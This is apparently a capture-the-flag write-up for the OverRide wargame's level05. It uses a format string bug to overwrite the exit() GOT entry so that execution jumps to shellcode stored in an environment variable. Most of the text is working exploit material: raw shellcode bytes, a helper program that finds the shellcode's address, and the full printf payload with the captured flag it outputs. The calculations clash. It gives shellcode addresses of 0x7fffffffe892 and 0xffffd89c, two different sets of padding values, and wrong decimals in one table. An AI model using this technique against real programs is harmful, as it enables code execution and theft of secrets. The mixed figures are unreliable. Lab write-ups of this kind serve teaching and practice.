level05@OverRide:~$ export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass'
level05@OverRide:~$ cat > /tmp/getenv.c << 'EOF'
> #include <stdlib.h>
> #include <stdio.h>
> int main(int argc, char *argv[]) {
>     printf("%p\n", getenv(argv[1]));
> }
> EOF
level05@OverRide:~$ gcc /tmp/getenv.c -o /tmp/getenv
level05@OverRide:~$ /tmp/getenv SHELLCODE
0x7fffffffe892
level05@OverRide:~$ (python -c "print '\xe0\x97\x04\x08\xe2\x97\x04\x08' + '%55432x%10\$hn%10095x%11\$hn'"; cat) | ./level05
# Level 05

## Overview

This level reads input from stdin, converts lowercase letters to uppercase (or vice versa?), and passes the result directly to printf() — creating a format string vulnerability. The program contains no password verification; the goal is to exploit printf() to execute arbitrary code.

## The Challenge

Key vulnerability: The program calls printf() directly on the user-controlled buffer after toggling the case of uppercase letters. This allows format string exploitation for arbitrary memory writes via %n.


## Exploitation Strategy

We cannot use shellcode in the buffer because:

The buffer is only 100 bytes

The case‑toggling would corrupt binary data (bytes in range 0x41–0x5A get XORed with 0x20)

Instead, we:

Store shellcode in an environment variable (unaffected by case toggling)

Overwrite a GOT entry to redirect execution to our shellcode

Use format string %n writes with %hn (2‑byte writes) for precision

# Target: Overwrite exit() GOT Entry

The program calls exit(0) at the end. If we overwrite the GOT entry of exit() with the address of our shellcode, when exit() is called, execution jumps to our shellcode instead of terminating.

Find exit() GOT address:

```bash
level05@OverRide:~$ objdump -R level05 | grep exit
080497e0 R_386_JUMP_SLOT   exit
level05@OverRide:~$ 

```
# Step 1: Store Shellcode in Environment
We store a shellcode that reads the flag for the next level (/home/users/level06/.pass):


```bash
    export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass'
```

NOP sled: 10 bytes of \x90
Shellcode: Reads and prints /home/users/level06/.pass

# Step 2: Find Shellcode Address
We need the runtime address of this environment variable:

```bash
level05@OverRide:~$ cat > /tmp/getenv.c << 'EOF'
#include <stdlib.h>
#include <stdio.h>
int main(int argc, char *argv[]) {
    printf("%p\n", getenv(argv[1]));
}
EOF

level05@OverRide:~$ gcc /tmp/getenv.c -o /tmp/getenv
level05@OverRide:~$ /tmp/getenv SHELLCODE
0xffffd89c
```
```text 
objdump -R ./level05 | grep exit
```
This should show: `080497e0 R_386_JUMP_SLOT   exit`

### Step 3: Calculate the format string values

Your shellcode address is `0xffffd89c`, which we need to write to GOT address `0x080497e0`.

Split into two parts:
- **Lower 2 bytes:** `0xd89c` = 55452 decimal
- **Upper 2 bytes:** `0xffff` = 65535 decimal

**Calculate padding:**
```
First write (lower bytes to 0x080497e0):
- Already printed: 8 bytes (two addresses)
- Target value: 55452
- Padding needed: 55452 - 8 = 55444
- Format: %55444x

Second write (upper bytes to 0x080497e2):
- Already printed: 55452
- Target value: 65535
- Padding needed: 65535 - 55452 = 10083
- Format: %10083x
```

# Step 3: Construct the Format String Exploit

We need to write this address (little‑endian) into 0x080497e0 (exit GOT).

Because the address 0x7fffffff is too large for a single %n write, we split it into two 2‑byte writes using %hn:


Target address	Value to write (2 bytes)	Decimal
0x080497e0	0xe892 (lower 2 bytes)	59538
0x080497e2	0x7fff (upper 2 bytes)	32767



# Format string technique:

Place the two target addresses at the beginning of our buffer

Use %<width>x%<offset>$hn to write the exact value to each address

The case‑toggling XOR affects bytes in range 0x41-0x5A — our addresses 0x080497e0 and 0x080497e2 are all outside this range (all bytes ≤ 0x80), so they remain unchanged.

Payload structure:
```
[address1][address2] + %[val1-8]x%[offset1]$hn + %[val2-val1]x%[offset2]$hn
```

# Step 4: Craft the exploit
```bash
(python -c "print '\xe0\x97\x04\x08\xe2\x97\x04\x08' + '%55444x%10\$hn%10083x%11\$hn'"; cat) | ./level05

h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq

```